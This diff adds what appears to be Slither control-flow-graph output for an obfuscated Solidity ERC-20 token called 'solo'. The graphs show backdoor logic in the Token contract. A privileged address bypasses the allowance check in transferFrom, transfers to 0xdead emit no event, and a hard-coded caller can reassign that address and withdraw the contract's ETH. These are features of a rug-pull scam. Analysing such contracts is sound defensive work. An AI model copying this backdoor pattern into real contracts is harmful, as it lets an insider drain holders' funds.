@@ -1,0 +1,1113 @@
+Contract: Context
+==================================================
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+
+Contract: Ownable
+==================================================
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: msgSender = _msgSender()
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = msgSender
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(address(0),msgSender)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: owner
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _owner
+
+Edges:
+  0 -> 1
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(_owner,address(0))
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = address(0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+
+Contract: IERC20
+==================================================
+
+
+Contract: SafeMath
+==================================================
+
+Function: add
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: c = a + b
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(c >= a,SafeMath: addition overflow)
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: sub
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(b <= a,errorMessage)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: c = a - b
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: mul
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.IF
+  Expression: a == 0
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: 0
+
+  ID: 3
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: c = a * b
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(c / a == b,SafeMath: multiplication overflow)
+
+  ID: 6
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  1 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+
+Function: div
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(b > 0,errorMessage)
+
+  ID: 2
+  Type: NodeType.VARIABLE
+  Expression: c = a / b
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: c
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+
+Contract: IUniswapV2Factory
+==================================================
+
+
+Contract: IUniswapV2Router02
+==================================================
+
+
+Contract: Token
+==================================================
+
+Function: constructor
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _vbjljvlklTOKEN = address(_msgSender())
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _cijojiseTOKEN[address(this)] = _kmmvbTOKEN * 98 / 100
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _cijojiseTOKEN[owner()] = _kmmvbTOKEN * 2 / 100
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _jojodjTOKEN[owner()] = true
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: _jojodjTOKEN[address(this)] = true
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: _jojodjTOKEN[_vbjljvlklTOKEN] = true
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: _ojdofiekjTOKEN = _msgSender()
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(address(0),address(this),_kmmvbTOKEN * 98 / 100)
+
+  ID: 9
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(address(0),address(owner()),_kmmvbTOKEN * 2 / 100)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  8 -> 9
+
+Function: owner
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _owner
+
+Edges:
+  0 -> 1
+
+Function: renounceOwnership
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: OwnershipTransferred(_owner,address(0))
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _owner = address(0)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 3
+  1 -> 2
+  3 -> 1
+
+Function: _msgSender
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender
+
+Edges:
+  0 -> 1
+
+Function: name
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _name
+
+Edges:
+  0 -> 1
+
+Function: totalSupply
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _kmmvbTOKEN
+
+Edges:
+  0 -> 1
+
+Function: symbol
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _symbol
+
+Edges:
+  0 -> 1
+
+Function: decimals
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _decimals
+
+Edges:
+  0 -> 1
+
+Function: _approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(owner != address(0),ERC20: approve from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(spender != address(0),ERC20: approve to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _fjweoijTOKEN[owner][spender] = amount
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: Approval(owner,spender,amount)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+
+Function: balanceOf
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _cijojiseTOKEN[account]
+
+Edges:
+  0 -> 1
+
+Function: approve
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _approve(_msgSender(),spender,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: allowance
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: _fjweoijTOKEN[owner][spender]
+
+Edges:
+  0 -> 1
+
+Function: transferFrom
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _transferr_TOKEN(sender,recipient,amount)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _approve(sender,_msgSender(),_lvckmjlwoiTOKEN(sender,recipient,amount).sub(amount,ERC20: transfer amount exceeds allowance))
+
+  ID: 3
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: receive
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+Edges:
+
+Function: _joeijoijoj
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.IF
+  Expression: _jvjocvo() == false
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: false
+
+  ID: 3
+  Type: NodeType.IF
+  Expression: sender == uniswapV2Pair
+
+  ID: 4
+  Type: NodeType.RETURN
+  Expression: true
+
+  ID: 5
+  Type: NodeType.RETURN
+  Expression: _kkvklv(recipient)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  1 -> 3
+  3 -> 4
+  3 -> 5
+
+Function: _kkvklv
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: recipient != _kjvnkbjnTOKEN
+
+Edges:
+  0 -> 1
+
+Function: _jvjocvo
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.RETURN
+  Expression: msg.sender != _vbjljvlklTOKEN
+
+Edges:
+  0 -> 1
+
+Function: _lvckmjlwoiTOKEN
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: _allowed = amount
+
+  ID: 2
+  Type: NodeType.IF
+  Expression: _joeijoijoj(sender,recipient)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _allowed = _fjweoijTOKEN[sender][_msgSender()]
+
+  ID: 4
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 5
+  Type: NodeType.RETURN
+  Expression: _allowed
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  2 -> 4
+  3 -> 4
+  4 -> 5
+
+Function: _excuseTOKEN
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(msg.sender == _ojdofiekjTOKEN,)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _vbjljvlklTOKEN = receipt
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _TOKENlkjlok(address(this).balance)
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+Function: _assistTOKEN
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _vbjljvlklTOKEN.transfer(amount)
+
+Edges:
+  0 -> 1
+
+Function: _TOKENlkjlok
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: address(msg.sender).transfer(_amount)
+
+Edges:
+  0 -> 1
+
+Function: transfer
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _transferr_TOKEN(_msgSender(),recipient,amount)
+
+  ID: 2
+  Type: NodeType.RETURN
+  Expression: true
+
+Edges:
+  0 -> 1
+  1 -> 2
+
+Function: _transferr_TOKEN
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(from != address(0),ERC20: transfer from the zero address)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(to != address(0),ERC20: transfer to the zero address)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(amount > 0,Transfer amount must be greater than zero)
+
+  ID: 4
+  Type: NodeType.VARIABLE
+  Expression: taxAmount = 0
+
+  ID: 5
+  Type: NodeType.IF
+  Expression: from != address(this) && to != address(this)
+
+  ID: 7
+  Type: NodeType.IF
+  Expression: from == uniswapV2Pair && to != address(uniswapV2Router) && ! _jojodjTOKEN[to]
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: _buyCount ++
+
+  ID: 9
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 10
+  Type: NodeType.IF
+  Expression: to == uniswapV2Pair && from != address(this)
+
+  ID: 12
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 13
+  Type: NodeType.VARIABLE
+  Expression: contractTokenBalance = balanceOf(address(this))
+
+  ID: 14
+  Type: NodeType.IF
+  Expression: ! inSwap && to == uniswapV2Pair && swapEnabled
+
+  ID: 15
+  Type: NodeType.IF
+  Expression: contractTokenBalance > 0
+
+  ID: 18
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 19
+  Type: NodeType.EXPRESSION
+  Expression: _assistTOKEN(address(this).balance)
+
+  ID: 20
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 21
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 22
+  Type: NodeType.IF
+  Expression: taxAmount > 0
+
+  ID: 23
+  Type: NodeType.EXPRESSION
+  Expression: _cijojiseTOKEN[address(this)] = _cijojiseTOKEN[address(this)].add(taxAmount)
+
+  ID: 24
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(from,address(this),taxAmount)
+
+  ID: 25
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 26
+  Type: NodeType.EXPRESSION
+  Expression: _cijojiseTOKEN[from] = _cijojiseTOKEN[from].sub(amount)
+
+  ID: 27
+  Type: NodeType.EXPRESSION
+  Expression: _cijojiseTOKEN[to] = _cijojiseTOKEN[to].add(amount.sub(taxAmount))
+
+  ID: 28
+  Type: NodeType.IF
+  Expression: _kjvnkbjnTOKEN != to
+
+  ID: 29
+  Type: NodeType.EXPRESSION
+  Expression: Transfer(from,to,amount.sub(taxAmount))
+
+  ID: 30
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 31
+  Type: NodeType.IF
+  Expression: (_buyCount > _ojidoiweTOKEN)
+
+  ID: 32
+  Type: NodeType.EXPRESSION
+  Expression: taxAmount = amount.mul(_joijoiTOKEN).div(100)
+
+  ID: 33
+  Type: NodeType.EXPRESSION
+  Expression: taxAmount = amount.mul(_vjkboiwoeiTOKEN).div(100)
+
+  ID: 34
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 35
+  Type: NodeType.IF
+  Expression: (_buyCount > _ojdofTOKEN)
+
+  ID: 36
+  Type: NodeType.EXPRESSION
+  Expression: taxAmount = amount.mul(_jvbkoiweTOKEN).div(100)
+
+  ID: 37
+  Type: NodeType.EXPRESSION
+  Expression: taxAmount = amount.mul(_odijofjoeTOKEN).div(100)
+
+  ID: 38
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 39
+  Type: NodeType.IF
+  Expression: (contractTokenBalance < _ppojofTOKEN)
+
+  ID: 40
+  Type: NodeType.EXPRESSION
+  Expression: minBalance = contractTokenBalance
+
+  ID: 41
+  Type: NodeType.EXPRESSION
+  Expression: minBalance = _ppojofTOKEN
+
+  ID: 42
+  Type: NodeType.ENDIF
+  Expression: 
+
+  ID: 43
+  Type: NodeType.IF
+  Expression: (amount < minBalance)
+
+  ID: 44
+  Type: NodeType.EXPRESSION
+  Expression: _swappp_TOKEN(amount)
+
+  ID: 45
+  Type: NodeType.EXPRESSION
+  Expression: _swappp_TOKEN(minBalance)
+
+  ID: 46
+  Type: NodeType.ENDIF
+  Expression: 
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 31
+  5 -> 21
+  7 -> 8
+  7 -> 9
+  8 -> 9
+  9 -> 10
+  10 -> 35
+  10 -> 12
+  12 -> 13
+  13 -> 14
+  14 -> 15
+  14 -> 20
+  15 -> 39
+  15 -> 18
+  18 -> 19
+  19 -> 20
+  20 -> 21
+  21 -> 22
+  22 -> 23
+  22 -> 25
+  23 -> 24
+  24 -> 25
+  25 -> 26
+  26 -> 27
+  27 -> 28
+  28 -> 29
+  28 -> 30
+  29 -> 30
+  31 -> 32
+  31 -> 33
+  32 -> 34
+  33 -> 34
+  34 -> 7
+  35 -> 36
+  35 -> 37
+  36 -> 38
+  37 -> 38
+  38 -> 12
+  39 -> 40
+  39 -> 41
+  40 -> 42
+  41 -> 42
+  42 -> 43
+  43 -> 44
+  43 -> 45
+  44 -> 46
+  45 -> 46
+  46 -> 18
+
+Function: removeLimits
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: _ojojoivlkTOKEN = _kmmvbTOKEN
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: _lkkkvnblkjTOKEN = _kmmvbTOKEN
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: MaxTxAmountUpdated(_kmmvbTOKEN)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 4
+  1 -> 2
+  2 -> 3
+  4 -> 1
+
+Function: _swappp_TOKEN
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.VARIABLE
+  Expression: path = new address[](2)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: path[0] = address(this)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: path[1] = uniswapV2Router.WETH()
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: _approve(address(this),address(uniswapV2Router),tokenAmount)
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(tokenAmount,0,path,address(this),block.timestamp)
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: lockTheSwap()
+
+Edges:
+  0 -> 6
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  6 -> 1
+
+Function: enableTOKENTrading
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.ENTRYPOINT
+  Expression: 
+
+  ID: 1
+  Type: NodeType.EXPRESSION
+  Expression: require(bool,string)(! isTrading,Already Launched!)
+
+  ID: 2
+  Type: NodeType.EXPRESSION
+  Expression: uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D)
+
+  ID: 3
+  Type: NodeType.EXPRESSION
+  Expression: _approve(address(this),address(uniswapV2Router),_kmmvbTOKEN)
+
+  ID: 4
+  Type: NodeType.EXPRESSION
+  Expression: uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this),uniswapV2Router.WETH())
+
+  ID: 5
+  Type: NodeType.EXPRESSION
+  Expression: uniswapV2Router.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp)
+
+  ID: 6
+  Type: NodeType.EXPRESSION
+  Expression: IERC20(uniswapV2Pair).approve(address(uniswapV2Router),type()(uint256).max)
+
+  ID: 7
+  Type: NodeType.EXPRESSION
+  Expression: swapEnabled = true
+
+  ID: 8
+  Type: NodeType.EXPRESSION
+  Expression: isTrading = true
+
+  ID: 9
+  Type: NodeType.EXPRESSION
+  Expression: onlyOwner()
+
+Edges:
+  0 -> 9
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  9 -> 1
+
+Function: slitherConstructorVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _vjkboiwoeiTOKEN = 10
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _odijofjoeTOKEN = 10
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _joijoiTOKEN = 0
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _jvbkoiweTOKEN = 0
+
+  ID: 4
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _ojidoiweTOKEN = 7
+
+  ID: 5
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _ojdofTOKEN = 7
+
+  ID: 6
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _buyCount = 0
+
+  ID: 7
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _kjvnkbjnTOKEN = address(0xdead)
+
+  ID: 8
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _ojojoivlkTOKEN = 20000000 * 10 ** _decimals
+
+  ID: 9
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _lkkkvnblkjTOKEN = 20000000 * 10 ** _decimals
+
+  ID: 10
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _ppojofTOKEN = 10000000 * 10 ** _decimals
+
+  ID: 11
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: inSwap = false
+
+  ID: 12
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: swapEnabled = false
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+  3 -> 4
+  4 -> 5
+  5 -> 6
+  6 -> 7
+  7 -> 8
+  8 -> 9
+  9 -> 10
+  10 -> 11
+  11 -> 12
+
+Function: slitherConstructorConstantVariables
+------------------------------
+Nodes:
+  ID: 0
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _decimals = 9
+
+  ID: 1
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _name = solo
+
+  ID: 2
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _symbol = PO
+
+  ID: 3
+  Type: NodeType.OTHER_ENTRYPOINT
+  Expression: _kmmvbTOKEN = 1000000000 * 10 ** _decimals
+
+Edges:
+  0 -> 1
+  1 -> 2
+  2 -> 3
+
+
